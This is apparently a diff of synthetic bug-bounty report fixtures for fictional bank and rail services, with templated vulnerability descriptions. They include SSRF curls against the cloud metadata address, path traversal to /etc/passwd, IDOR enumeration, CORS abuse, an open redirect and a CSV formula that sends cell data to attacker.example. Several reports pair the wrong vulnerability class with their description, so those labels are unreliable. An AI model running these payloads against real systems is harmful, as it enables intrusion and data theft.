+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://mobile.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21936,7 +22104,8 @@
           "offset": "7d 8h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://mobile.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22076,7 +22245,8 @@
           "offset": "4d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.glaciervaultbank.foo/v2/api/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22200,7 +22370,8 @@
           "offset": "5d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://mobile.glaciervaultbank.foo/import`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22336,7 +22507,8 @@
           "offset": "4d 17h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://banking.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22467,7 +22639,8 @@
           "offset": "1d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://banking.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22642,7 +22815,8 @@
           "offset": "5d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://banking.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22749,7 +22923,8 @@
           "offset": "2d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://mobile.glaciervaultbank.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22868,7 +23043,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.glaciervaultbank.foo/v2/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22995,7 +23171,8 @@
           "offset": "9d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.glaciervaultbank.foo/v2/statements/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/helio_rail_reports.json b/fixtures/reports/helio_rail_reports.json
index 3179acc..484c10a 100644
--- a/fixtures/reports/helio_rail_reports.json
+++ b/fixtures/reports/helio_rail_reports.json
@@ -81,7 +81,8 @@
           "offset": "6d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The support log viewer exposes a query parameter (file) that is concatenated to a server-side path without proper sanitization or canonicalization. As a consequence, an authenticated support agent can supply traversal sequences (e.g., ../) to escape the intended logs directory and read arbitrary files on the host, such as /etc/passwd or application configuration files. The lack of normalization against a known base directory and absence of an allowlist of filenames makes the issue trivial to exploit. Symlink following is also enabled, meaning an attacker could potentially chain symlinks to reach other sensitive locations. This behavior presents a clear information disclosure risk that can lead to leakage of credentials, service tokens, and environment secrets.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.heliorail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Support 1.2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Authenticate as a support agent and navigate to the log viewer route documented in internal tools.\n- First request a benign file name (e.g., app.log) to observe expected behavior and baseline response format.\n- Change the file parameter to include traversal sequences such as ../../../../etc/passwd and submit the request.\n- Observe that the server responds with the contents of the targeted system file rather than restricting access to the logs directory.\n- Repeat using alternative traversal patterns and encodings (..%2F..%2F..%2F..%2Fetc/passwd, ..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini) to demonstrate lack of normalization and platform-agnostic validation.\n- Verify that log files outside the intended directory and application configuration files under /etc or the deploy directory are also reachable, confirming the absence of an allowlist and canonical path checks.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -206,7 +207,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://dash.heliorail.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -388,7 +390,8 @@
           "offset": "7d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dash.heliorail.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -479,7 +482,8 @@
           "offset": "3d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -598,7 +602,8 @@
           "offset": "3d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.heliorail.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -724,7 +729,8 @@
           "offset": "2d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dash.heliorail.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -868,7 +874,8 @@
           "offset": "7d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -976,7 +983,8 @@
           "offset": "1d 21h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/api/me`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1140,7 +1148,8 @@
           "offset": "5d 21h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.heliorail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1274,7 +1283,8 @@
           "offset": "2d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dash.heliorail.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1399,7 +1409,8 @@
           "offset": "20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.heliorail.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1519,7 +1530,8 @@
           "offset": "7d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.heliorail.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1642,7 +1654,8 @@
           "offset": "3d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://dash.heliorail.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1765,7 +1778,8 @@
           "offset": "4d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://dash.heliorail.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1912,7 +1926,8 @@
           "offset": "11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2055,7 +2070,8 @@
           "offset": "4d 13h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://dash.heliorail.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2223,7 +2239,8 @@
           "offset": "6d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://dash.heliorail.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2375,7 +2392,8 @@
           "offset": "5d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.heliorail.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2514,7 +2532,8 @@
           "offset": "2d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://dash.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2662,7 +2681,8 @@
           "offset": "2d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.heliorail.foo/export`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2780,7 +2800,8 @@
           "offset": "13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
